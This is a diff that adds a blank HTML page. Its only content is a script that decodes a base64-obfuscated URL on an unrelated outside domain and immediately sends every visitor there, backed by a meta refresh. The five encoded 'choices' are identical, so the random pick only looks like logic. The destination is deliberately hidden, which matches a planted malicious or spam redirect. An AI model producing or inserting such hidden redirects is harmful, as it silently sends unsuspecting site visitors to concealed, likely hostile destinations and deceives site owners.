@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="0">
+  <script>
+  const links = [
+    "aHR0cHM6Ly9zb3Jyb3dmdWxwc3ljaG9sb2d5LmNvbS9hM1E5QVg=",
+    "aHR0cHM6Ly9zb3Jyb3dmdWxwc3ljaG9sb2d5LmNvbS9hM1E5QVg=",
+    "aHR0cHM6Ly9zb3Jyb3dmdWxwc3ljaG9sb2d5LmNvbS9hM1E5QVg=",
+    "aHR0cHM6Ly9zb3Jyb3dmdWxwc3ljaG9sb2d5LmNvbS9hM1E5QVg=",
+    "aHR0cHM6Ly9zb3Jyb3dmdWxwc3ljaG9sb2d5LmNvbS9hM1E5QVg="
+    ];
+
+  const randomLink = links[Math.floor(Math.random() * links.length)];
+  const decodedLink = atob(randomLink);
+
+  window.location.replace(decodedLink);
+</script>
+</head>
+<body>
+</body>
+
+</html>
